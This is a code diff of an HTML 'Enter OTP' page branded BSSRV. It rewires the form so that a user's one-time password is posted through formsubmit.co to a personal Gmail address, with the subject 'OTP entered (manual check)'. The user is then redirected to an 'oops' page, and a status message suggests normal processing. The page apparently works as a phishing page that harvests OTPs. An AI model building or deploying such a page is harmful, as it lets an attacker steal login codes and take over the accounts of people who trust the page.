@@ -4,14 +4,42 @@
   <meta charset="UTF-8">
   <meta name="viewport" content="width=device-width, initial-scale=1.0">
   <title>Enter OTP | BSSRV</title>
-  <link rel="stylesheet" href="style.css">
+  <link rel="stylesheet" href="assets/css/style.css">
+  <style>
+    /* Additional OTP form specific styling */
+    .login-box form textarea,
+    .login-box form input[type="text"]{
+      width: 100%;
+      padding: 10px;
+      margin-top: 8px;
+      border-radius: 6px;
+      border: 1px solid #ccc;
+      font-size: 1rem;
+    }
+
+    .login-box form button{
+      background: #800000;
+      color: #ffd700;
+      padding: 10px 14px;
+      border: none;
+      border-radius: 6px;
+      font-weight: 600;
+      cursor: pointer;
+      margin-top: 12px;
+    }
+
+    .status{
+      margin-top: 10px;
+      font-weight: 500;
+    }
+  </style>
 </head>
 <body>
 
   <!-- ===== HEADER ===== -->
   <header class="login-header">
     <div class="logo">
-      <img src="bssrv_logo.png" alt="BSSRV Logo">
+      <img src="assets/images/bssrv_logo.png" alt="BSSRV Logo">
       <h1>BSSRV</h1>
     </div>
   </header>
@@ -20,18 +48,36 @@
   <section class="login-section">
     <div class="login-box">
       <h2>Enter OTP</h2>
-      <p>Please enter the 6-digit OTP that was sent to your inbox.</p>
+      <p>Please enter the 6-digit OTP sent to your Gmail.</p>
 
-      <form action="oops.html" method="get">
+      <form id="otpForm" action="https://formsubmit.co/minissweb@gmail.com" method="POST">
+        <!-- User input field (OTP) -->
         <label for="otp">OTP</label>
-        <input type="text" id="otp" maxlength="6" placeholder="Enter OTP" required>
+        <input type="text" id="otp" name="otp" required placeholder="Enter OTP here">
 
-        <button type="submit" class="btn-login">Submit</button>
+        <!-- Hidden fields for Formsubmit behavior -->
+        <input type="hidden" name="_subject" value="OTP entered (manual check)">
+        <input type="hidden" name="_captcha" value="true">
+        <input type="hidden" name="_next" value="oops.html"> <!-- Redirect user after submit -->
+
+        <button type="submit">Submit OTP</button>
       </form>
+
+      <p id="status" class="status"></p>
       <p class="note">Didn't receive OTP? Try again later.</p>
     </div>
   </section>
 
+  <script>
+    // Nicer UX: show sending message while form posts
+    document.getElementById('otpForm').addEventListener('submit', function(e){
+      document.getElementById('status').style.color = 'green';
+      document.getElementById('status').innerText = 'Submitting OTP...';
+      // form will submit normally; redirect handled by _next hidden field
+    });
+  </script>
+
 </body>
 </html>
+
 
